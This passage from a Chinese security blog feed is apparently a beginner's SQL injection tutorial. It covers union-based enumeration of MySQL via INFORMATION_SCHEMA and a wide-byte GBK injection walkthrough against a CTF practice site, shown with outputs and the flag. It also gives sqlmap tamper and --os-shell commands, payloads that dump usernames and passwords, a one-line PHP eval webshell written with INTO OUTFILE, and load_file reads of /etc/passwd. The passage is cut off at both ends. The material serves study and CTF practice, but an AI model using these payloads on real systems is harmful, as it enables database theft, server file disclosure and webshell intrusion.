class=\"token function\">id</span> --dmsmysql--os-shell</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>接下来指定网站可写目录：“C:<span class=\"token punctuation\">\\</span>www”</pre></td></tr></table></figure><h1 id=\"sqlmap思维导图\"><a class=\"anchor\" href=\"#sqlmap思维导图\">#</a> SQLmap 思维导图</h1>\n<p>源自 XBX 白细胞安全团队（LEUKOCYTE）<br />\n右键新标签页查看 sqlmap 思维导图 <img data-src=\"sqlmap%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "SQLmap"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/",
            "title": "初学SQLinjection",
            "date_published": "2020-12-02T03:46:32.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>内容是网上收集的，可能存在错误</p>\n</blockquote>\n<h1 id=\"sqlinjection-原理\"><a class=\"anchor\" href=\"#sqlinjection-原理\">#</a> SQLinjection 原理</h1>\n<p>用户【可控参数】中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。</p>\n<p>其原因可以归结为以下两个原因叠加造成的：</p>\n<ol>\n<li>程序编写者在处理程序和数据库交互时，使用【字符串拼接】的方式构造 SQL 语句。</li>\n<li>未对【用户可控参数】进行足够的过滤便将参数内容拼接到 SQL 查询语句中。</li>\n</ol>\n<h1 id=\"sql注入的分类\"><a class=\"anchor\" href=\"#sql注入的分类\">#</a> SQL 注入的分类</h1>\n<p>在《web 安全深度剖析》这本书中作者张炳帅前辈认为 SQL 注入只分为数字型与字符型，其他的注入不过是这两大类型的不同展现形式，或不同展现位置罢了。<br />\n这些都是前辈们的总结</p>\n<ol>\n<li>\n<p><strong>按变量类型分类</strong></p>\n<ul>\n<li>数字型</li>\n<li>字符型</li>\n</ul>\n</li>\n<li>\n<p><strong>按 HTTP 提交方式分类</strong></p>\n<ul>\n<li>GET 注入</li>\n<li>POST 注入</li>\n<li>Cookie 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>按注入方式分类</strong></p>\n<ul>\n<li>报错注入</li>\n<li>盲注</li>\n<li>布尔盲注</li>\n<li>时间盲注</li>\n<li>union 注入</li>\n</ul>\n</li>\n<li>\n<p><strong>编码问题</strong></p>\n<ul>\n<li>宽字节注入</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"mysql-50以上和mysql-50以下版本的区别\"><a class=\"anchor\" href=\"#mysql-50以上和mysql-50以下版本的区别\">#</a> MySQL 5.0 以上和 MySQL 5.0 以下版本的区别</h1>\n<p>MySQL 5.0 以上版本存在一个存储着数据库信息的信息数据库 --INFORMATION_SCHEMA ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而 5.0 以下没有。</p>\n<h2 id=\"information_schema-库\"><a class=\"anchor\" href=\"#information_schema-库\">#</a> INFORMATION_SCHEMA 库</h2>\n<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>\n<h3 id=\"schemata表\"><a class=\"anchor\" href=\"#schemata表\">#</a> SCHEMATA 表</h3>\n<p>储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名的字段名为 SCHEMA_NAME。</p>\n</blockquote>\n<h3 id=\"tables表\"><a class=\"anchor\" href=\"#tables表\">#</a> TABLES 表</h3>\n<p>储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME。</p>\n</blockquote>\n<h3 id=\"columns表\"><a class=\"anchor\" href=\"#columns表\">#</a> COLUMNS 表</h3>\n<p>储存 mysql 中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>\n<blockquote>\n<p>我们需要记住该表中记录数据库库名、表名和字段名的字段名为 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME。</p>\n</blockquote>\n<h1 id=\"常用的关于information_schema库的sql语句\"><a class=\"anchor\" href=\"#常用的关于information_schema库的sql语句\">#</a> 常用的关于 information_schema 库的 SQL 语句</h1>\n<p>需要记住的几个函数</p>\n<ul>\n<li>database ()：当前网站使用的数据库</li>\n<li>version ()：当前 MySQL 的版本</li>\n<li>user ()：当前 MySQL 的用户</li>\n</ul>\n<p>limit 的用法<br />\n limit m,n 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指取 n 条记录。</p>\n<h2 id=\"查询数据表\"><a class=\"anchor\" href=\"#查询数据表\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>mysql 的联合查询会把所有的查询结果返回到第一个查询的字段下，在注入过程中常让第一个查询结果错误，这样就只显示你联合查询的结果了</p>\n<h2 id=\"查询字段\"><a class=\"anchor\" href=\"#查询字段\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"一句话总结\"><a class=\"anchor\" href=\"#一句话总结\">#</a> 一句话总结</h2>\n<p><em><strong>查询数据表与表字段的时候会用到 information_schema 库</strong></em></p>\n<h1 id=\"sql注入的基本流程\"><a class=\"anchor\" href=\"#sql注入的基本流程\">#</a> SQL 注入的基本流程</h1>\n<h2 id=\"判断是否存在注入点\"><a class=\"anchor\" href=\"#判断是否存在注入点\">#</a> 判断是否存在注入点</h2>\n<h2 id=\"判断注入类型\"><a class=\"anchor\" href=\"#判断注入类型\">#</a> 判断注入类型</h2>\n<h2 id=\"猜字段数量\"><a class=\"anchor\" href=\"#猜字段数量\">#</a> 猜字段数量</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>order by <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>后面加数字是对查询的第几列排序，从而实现判断字段的个数的目的</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>迭代1~n,直到页面出错（也就是数据库报错了，里面没有这一列。）</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>order by <span class=\"token number\">5</span>  页面正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>order by <span class=\"token number\">6</span>  页面错误</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>共有6个字段</pre></td></tr></table></figure><h2 id=\"看看哪个字段回显\"><a class=\"anchor\" href=\"#看看哪个字段回显\">#</a> 看看哪个字段回显</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1,2</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>看回显什么数字，就可以知道那个字段回显。</pre></td></tr></table></figure><h2 id=\"查询数据库名版本用户\"><a class=\"anchor\" href=\"#查询数据库名版本用户\">#</a> 查询数据库名，版本，用户</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">..</span></pre></td></tr></table></figure><h2 id=\"查询数据表-2\"><a class=\"anchor\" href=\"#查询数据表-2\">#</a> 查询数据表</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> table_name from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span> union <span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> from information_schema.tables where <span class=\"token assign-left variable\">table_schema</span><span class=\"token operator\">=</span>database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"查询字段-2\"><a class=\"anchor\" href=\"#查询字段-2\">#</a> 查询字段</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span>,3,4 from information_schema.columns where <span class=\"token assign-left variable\">table_name</span><span class=\"token operator\">=</span><span class=\"token string\">'你查询出来的表名'</span></pre></td></tr></table></figure><h2 id=\"查询数据\"><a class=\"anchor\" href=\"#查询数据\">#</a> 查询数据</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>union selcet <span class=\"token number\">1</span>,group_concat<span class=\"token punctuation\">(</span>要查询的字段1,字段2,<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>字段n<span class=\"token punctuation\">)</span>,3,4 from 数据表<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>union <span class=\"token keyword\">select</span> <span class=\"token number\">1</span>,<span class=\"token punctuation\">(</span>select group_concat<span class=\"token punctuation\">(</span>字段<span class=\"token punctuation\">)</span> from 数据表<span class=\"token punctuation\">)</span>,3,4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h1>\n<h2 id=\"宽字节注入产生的原因\"><a class=\"anchor\" href=\"#宽字节注入产生的原因\">#</a> 宽字节注入产生的原因</h2>\n<p>宽字节注入就是用一个大于 128 的十六进制数来吃掉转义符 ```</p>\n<p>gbk 编码，用两个字节作为一个字符的编码.</p>\n<h2 id=\"宽字节注入的手工注入流程\"><a class=\"anchor\" href=\"#宽字节注入的手工注入流程\">#</a> 宽字节注入的手工注入流程</h2>\n<p>1、判断列数：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 1%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 2%23<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> order by 3%23<br />\norder by 3 时报错，说明只有两列。</p>\n<p>2、各类信息：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(concat_ws(char(32,58,32),user(),database(),version()))%23<br />\n<span class=\"exturl\" data-url=\"bWFpbHRvOnNhZS1jaGluYWxvdmVyQDEyMy4xMjUuMjMuMjEy\">sae-chinalover@123.125.23.212</span> : sae-chinalover : 5.5.52-0ubuntu0.14.04.1</p>\n<p>3、库名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2 union select 2,database()%23<br />\nsae-chinalover</p>\n<p>4、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(table_name)<br />\nfrom information_schema.tables<br />\nwhere table_schema=database()%23<br />\nctf,ctf2,ctf3,ctf4,news</p>\n<p>5、ctf4 表的列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,group_concat(column_name)<br />\nfrom information_schema.columns<br />\nwhere table_name=0x63746634%23<br />\nid,flag</p>\n<p>这里注意：要将表名 ctf4 转为 16 进制</p>\n<p>这里提供一个字符串转 16 进制的网站：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41aXh1ZXhpd2FuZy5jb20vc3RyL2hleC5waHA=\">http://www.5ixuexiwang.com/str/hex.php</span></p>\n<p>转了 16 进制之后记得在前面加上 0x</p>\n<p this_is_sqli_flag=\"\">6、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9JWRmJTI3\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=�'</span> and 1=2<br />\nunion select 2,(select flag from ctf4)%23<br />\nflag</p>\n<h2 id=\"使用sqlmap进行宽字节注入\"><a class=\"anchor\" href=\"#使用sqlmap进行宽字节注入\">#</a> 使用 SQLmap 进行宽字节注入</h2>\n<p>sqlmap 跑法<br />\n 1、查看有哪些库：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes --dbs<br />\n 这个时侯就要用到一个脚本了：</p>\n<p>脚本名：<span class=\"exturl\" data-url=\"aHR0cDovL3VubWFnaWNxdW90ZXMucHk=\">unmagicquotes.py</span></p>\n<p>作用：宽字符绕过</p>\n<p>2、表名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  --tables</p>\n<p>3、列名：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 --columns</p>\n<p>4、flag 列的数据：<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u &quot;<span class=\"exturl\" data-url=\"aHR0cDovL2NoaW5hbG92ZXIuc2luYWFwcC5jb20vU1FMLUdCSy9pbmRleC5waHA/aWQ9Mw==\">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3</span>&quot; --tamper unmagicquotes -D  <code>sae-chinalover</code>  -T ctf4 -C flag</p>\n<h1 id=\"常用姿势\"><a class=\"anchor\" href=\"#常用姿势\">#</a> 常用姿势</h1>\n<h2 id=\"判断是否存在sql注入\"><a class=\"anchor\" href=\"#判断是否存在sql注入\">#</a> 判断是否存在 SQL 注入</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>and <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>'</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\"</pre></td></tr></table></figure><h2 id=\"暴字段长度\"><a class=\"anchor\" href=\"#暴字段长度\">#</a> 暴字段长度</h2>\n<p>Order by 数字</p>\n<h2 id=\"匹配字段\"><a class=\"anchor\" href=\"#匹配字段\">#</a> 匹配字段</h2>\n<p>and 1=1 union select 1,2,…,n</p>\n<h2 id=\"暴字段位置回显位\"><a class=\"anchor\" href=\"#暴字段位置回显位\">#</a> 暴字段位置（回显位）</h2>\n<p>and 1=2 union select 1,2,…,n</p>\n<h2 id=\"利用内置函数暴数据库信息\"><a class=\"anchor\" href=\"#利用内置函数暴数据库信息\">#</a> 利用内置函数暴数据库信息</h2>\n<p>version() database() user()</p>\n<h2 id=\"不用猜解可用字段暴数据库信息有些网站不适用\"><a class=\"anchor\" href=\"#不用猜解可用字段暴数据库信息有些网站不适用\">#</a> 不用猜解可用字段暴数据库信息 (有些网站不适用):</h2>\n<p>and 1=2 union all select version()<br />\nand 1=2 union all select database()<br />\nand 1=2 union all select user()</p>\n<h2 id=\"操作系统信息\"><a class=\"anchor\" href=\"#操作系统信息\">#</a> 操作系统信息：</h2>\n<p>and 1=2 union all select @@global.version_compile_os from mysql.user</p>\n<h2 id=\"数据库权限\"><a class=\"anchor\" href=\"#数据库权限\">#</a> 数据库权限：</h2>\n<p>and ord (mid (user (),1,1))=114 返回正常说明为 root</p>\n<h2 id=\"暴库-mysql50\"><a class=\"anchor\" href=\"#暴库-mysql50\">#</a> 暴库 (mysql&gt;5.0)</h2>\n<p>Mysql 5 以上有内置库 information_schema，存储着 mysql 的所有数据库和<br />\n表结构信息</p>\n<p>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.SCHEMATA limit 0,1</p>\n<h2 id=\"猜表\"><a class=\"anchor\" href=\"#猜表\">#</a> 猜表</h2>\n<p>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.TABLES where TABLE_SCHEMA = 数据库（十六进制） limit 0（开始的记录，0 为第一个开始记录）,1（显示 1 条记录）—</p>\n<h2 id=\"猜字段\"><a class=\"anchor\" href=\"#猜字段\">#</a> 猜字段</h2>\n<p>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from<br />\ninformation_schema.COLUMNS where TABLE_NAME = 表名（十六进制）limit 0,1</p>\n<h2 id=\"暴密码\"><a class=\"anchor\" href=\"#暴密码\">#</a> 暴密码</h2>\n<p>and 1=2 Union select 1,2,3, 用户名段，5,6,7, 密码段，8,9 from 表名 limit 0,1 高级用法（一个可用字段显示两个数据内容）：<br />\nUnion select 1,2,3concat (用户名段，0x3c, 密码段),5,6,7,8,9 from 表名 limit 0,1</p>\n<h2 id=\"直接写马root权限\"><a class=\"anchor\" href=\"#直接写马root权限\">#</a> 直接写马 (Root 权限)</h2>\n<p>条件：<br />\n1、知道站点物理路径<br />\n 2、有足够大的权限（可以用 select …. from mysql.user 测试）<br />\n3、magic_quotes_gpc()=OFF<br />\nselect ‘<?php eval_r($_POST[cmd])?>’ into outfile ‘物理路径’<br />\nand 1=2 union all select 一句话 HEX 值 into outfile ‘路径’</p>\n<h2 id=\"文件读写\"><a class=\"anchor\" href=\"#文件读写\">#</a> 文件读写</h2>\n<p>即通过数据库来读写服务器上的文件</p>\n<p>LOAD_FILE(file_name)</p>\n<p>其中 file_name 是文件的完整路径。</p>\n<p>示例:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'D:/wamp64/tmp/1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>+----------------------------------+</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">666</span>                              <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>+----------------------------------+</pre></td></tr></table></figure><p>select …… into outfile</p>\n<p>outfile 函数可以导出多行，而 dumpfile 只能导出一行数据<br />\n outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式<br />\n outfile 函数会在写入的文件最后加一个换行，即多写一行</p>\n<p>实例：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into outfile <span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test1.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> a<span class=\"token punctuation\">\\</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>aaaa</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>+---------------------------+</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token string\">'a<span class=\"token entity\" title=\"\\n\">\\n</span>aa<span class=\"token entity\" title=\"\\r\">\\r</span>aaaa'</span> into dumpfile <span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Query OK, <span class=\"token number\">1</span> row affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    -<span class=\"token operator\">></span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">|</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'d:/test.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">|</span> a</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>aaaa                <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>+--------------------------+</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token number\">1</span> row <span class=\"token keyword\">in</span> <span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有一个需要关注的点就是：outfile 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径。这个问题在 php 注入中更加麻烦，因为会自动将单引号转义成 ', 那么基本就 GG 了，但是 load_file，后面的路径可以是单引号、0x、char 转换的字符，但是路径中的斜杠是 / 而不是 \\</p>\n<h3 id=\"mysql新特性secure_file_priv对读写文件的影响\"><a class=\"anchor\" href=\"#mysql新特性secure_file_priv对读写文件的影响\">#</a> MYSQL 新特性 secure_file_priv 对读写文件的影响</h3>\n<p>secure-file-priv 特性<br />\n secure-file-priv 参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE () 传到哪个指定目录的。</p>\n<font color=\"red\">\n<ul>\n<li>\n<p>secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入 | 导出</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下</p>\n</li>\n<li>\n<p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制</p>\n</li>\n</ul>\n</font>\n<p>如何查看 secure-file-priv 参数的值：</p>\n<p><code>show global variables like '%secure%';</code></p>\n<pre><code>+--------------------------+------+\n| Variable_name            | Value|\n+--------------------------+------+\n| require_secure_transport | OFF  |\n| secure_auth              | ON   |\n| secure_file_priv         | NULL |\n+--------------------------+------+\n</code></pre>\n<p>修改 secure_file_priv 的值:<br />\nwindows 下：修改 my.ini 在 [mysqld] 内加入 secure_file_priv =<br />\nlinux 下：修改 my.cnf 在 [mysqld] 内加入 secure_file_priv =<br />\n 然后重启 mysql，再查询 secure_file_priv</p>\n<h3 id=\"load_file-常用路径\"><a class=\"anchor\" href=\"#load_file-常用路径\">#</a> load_file () 常用路径：</h3>\n<p>1、 replace(load_file(0×2F6574632F706173737764),0×3c,0×20)<br />\n2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>\n<p>上面两个是查看一个 PHP 